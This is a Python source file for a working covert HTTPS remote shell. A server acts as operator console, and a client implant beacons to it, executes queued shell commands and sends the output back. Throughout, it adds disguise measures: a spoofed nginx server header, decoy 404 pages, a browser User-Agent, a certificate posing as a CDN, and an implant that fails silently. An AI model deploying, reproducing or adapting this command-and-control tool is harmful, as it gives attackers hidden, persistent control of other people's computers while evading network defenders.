#!/usr/bin/env python3
"""
HTTPS covert channel remote shell.

The server is the operator console.  The client (implant) beacons to it
every few seconds, picks up a queued command, executes it, and POSTs the
output back.  All traffic is TLS-encrypted and looks like ordinary HTTPS
JSON API calls to a passive observer.

A self-signed cert is auto-generated on first run (requires openssl in PATH).
Pass --cert / --key to use your own.

Usage:
  server:  sudo python3 https_shell.py server [--port 443] [--cert c.pem --key k.pem]
  client:  python3 https_shell.py client <server_ip> [--port 443]

Endpoints (all traffic over TLS):
  GET  /b  — implant beacon: server returns next pending command
  POST /r  — implant result:  implant uploads base64-encoded output
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.request import Request, urlopen

try:
    from http.server import ThreadingHTTPServer
except ImportError:
    import socketserver
    class ThreadingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
        daemon_threads = True

BEACON_PATH   = '/b'
RESULT_PATH   = '/r'
BEACON_SECS   = 3.0
OUTPUT_MAX    = 65536

# ── TLS ───────────────────────────────────────────────────────────────────────

def gen_self_signed_cert(cert: str, key: str) -> None:
    subprocess.run([
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
        '-keyout', key, '-out', cert,
        '-days', '365', '-nodes',
        '-subj', '/CN=cdn.example.com/O=Example Inc/C=US',
    ], check=True, capture_output=True)

# ── Shared C2 state ───────────────────────────────────────────────────────────

class C2:
    """Thread-safe store for the pending command and its result."""

    def __init__(self):
        self._lock      = threading.Lock()
        self._result_ev = threading.Event()
        self._pending   = None   # (cid, cmd) | None
        self._results   = {}     # cid -> bytes
        self._next_id   = 1

    def queue(self, cmd: str) -> int:
        with self._lock:
            cid = self._next_id
            self._next_id += 1
            self._pending = (cid, cmd)
        return cid

    def peek(self) -> tuple | None:
        with self._lock:
            return self._pending

    def ack(self, cid: int) -> None:
        with self._lock:
            if self._pending and self._pending[0] == cid:
                self._pending = None

    def store_result(self, cid: int, output: bytes) -> None:
        with self._lock:
            self._results[cid] = output
        self._result_ev.set()

    def wait_result(self, cid: int, timeout: float = 30.0) -> bytes | None:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                if cid in self._results:
                    return self._results.pop(cid)
            self._result_ev.wait(timeout=0.3)
            self._result_ev.clear()
        return None


_c2 = C2()

# ── HTTP handler ──────────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    server_version = 'nginx/1.24.0'
    sys_version    = ''

    def log_message(self, fmt, *args):
        sys.stderr.write(f"  [>] {self.client_address[0]}  {fmt % args}\n")
        sys.stderr.flush()

    def _json(self, data: dict, code: int = 200) -> None:
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _fake404(self) -> None:
        body = b'<!DOCTYPE html><html><body>Not Found</body></html>'
        self.send_response(404)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == BEACON_PATH:
            p = _c2.peek()
            if p:
                cid, cmd = p
                self._json({'id': cid,
                            'cmd': base64.b64encode(cmd.encode()).decode()})
            else:
                self._json({'id': 0, 'cmd': ''})
        else:
            self._fake404()

    def do_POST(self):
        if self.path == RESULT_PATH:
            n = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(n)
            try:
                data   = json.loads(body)
                cid    = int(data['id'])
                output = base64.b64decode(data['out'])
                _c2.store_result(cid, output)
                _c2.ack(cid)
                self._json({'ok': True})
            except Exception:
                self._json({'ok': False}, code=400)
        else:
            self._fake404()

# ── server ────────────────────────────────────────────────────────────────────

def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '(unknown)'


def do_server(port: int, cert: str, key: str) -> None:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)

    httpd = ThreadingHTTPServer(('0.0.0.0', port), Handler)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    ip = _local_ip()
    print(f"[*] Server IP  : {ip}")
    print(f"[*] HTTPS C2   : https://{ip}:{port}")
    print(f"[*] Cert       : {cert}")
    print(f"[*] Beacon path: GET {BEACON_PATH}  POST {RESULT_PATH}")
    print(f"[*] Waiting for implant…\n")

    while True:
        try:
            cmd = input("https> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down.")
            httpd.shutdown()
            break

        if not cmd:
            continue
        if cmd.lower() in ('exit', 'quit'):
            httpd.shutdown()
            break

        cid = _c2.queue(cmd)
        print(f"[*] Queued (id={cid}), waiting for next beacon…")
        result = _c2.wait_result(cid, timeout=30.0)
        if result is None:
            print("[!] Timed out — no beacon within 30 s.")
        else:
            sys.stdout.write(result.decode('utf-8', errors='replace'))
            sys.stdout.flush()

# ── client (implant) ──────────────────────────────────────────────────────────

def run_command(cmd: str) -> bytes:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           timeout=15, text=True)
        out = r.stdout + r.stderr
        return (out or f"(exit {r.returncode})\n").encode('utf-8', errors='replace')
    except subprocess.TimeoutExpired:
        return b"(timed out)\n"
    except Exception as e:
        return f"(error: {e})\n".encode()


def do_client(server_ip: str, port: int) -> None:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE   # accept self-signed cert

    base_url = f"https://{server_ip}:{port}"
    last_cid = 0

    print(f"[*] Implant beaconing → {base_url}  (every {BEACON_SECS}s)")

    while True:
        try:
            req = Request(f"{base_url}{BEACON_PATH}",
                          headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            with urlopen(req, context=ctx, timeout=10) as resp:
                data = json.loads(resp.read())

            cid     = int(data.get('id', 0))
            cmd_b64 = data.get('cmd', '')

            if cid and cmd_b64 and cid != last_cid:
                last_cid = cid
                cmd    = base64.b64decode(cmd_b64).decode('utf-8', errors='replace')
                output = run_command(cmd)

                body = json.dumps({
                    'id':  cid,
                    'out': base64.b64encode(output).decode(),
                }).encode()
                req2 = Request(
                    f"{base_url}{RESULT_PATH}",
                    data=body,
                    headers={'Content-Type': 'application/json',
                             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
                )
                with urlopen(req2, context=ctx, timeout=10):
                    pass

        except Exception:
            pass   # stay silent — implant should never crash

        time.sleep(BEACON_SECS)

# ── main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(description="HTTPS covert shell")
    sub = ap.add_subparsers(dest='mode', required=True)

    sp = sub.add_parser('server')
    sp.add_argument('--port', type=int, default=443)
    sp.add_argument('--cert', default='')
    sp.add_argument('--key',  default='')

    cp = sub.add_parser('client')
    cp.add_argument('server_ip')
    cp.add_argument('--port', type=int, default=443)

    args = ap.parse_args()

    if args.mode == 'server':
        cert, key = args.cert, args.key
        if not cert or not key:
            tmp  = tempfile.mkdtemp(prefix='https_shell_')
            cert = os.path.join(tmp, 'cert.pem')
            key  = os.path.join(tmp, 'key.pem')
            print("[*] Generating self-signed cert…")
            try:
                gen_self_signed_cert(cert, key)
            except (FileNotFoundError, subprocess.CalledProcessError) as e:
                sys.exit(f"[!] openssl failed: {e}\n"
                         f"    Install openssl or pass --cert / --key")
        try:
            do_server(args.port, cert, key)
        except PermissionError:
            sys.exit("[!] Port 443 requires root. Use --port 8443 for unprivileged.")
    else:
        do_client(args.server_ip, args.port)


if __name__ == '__main__':
    main()
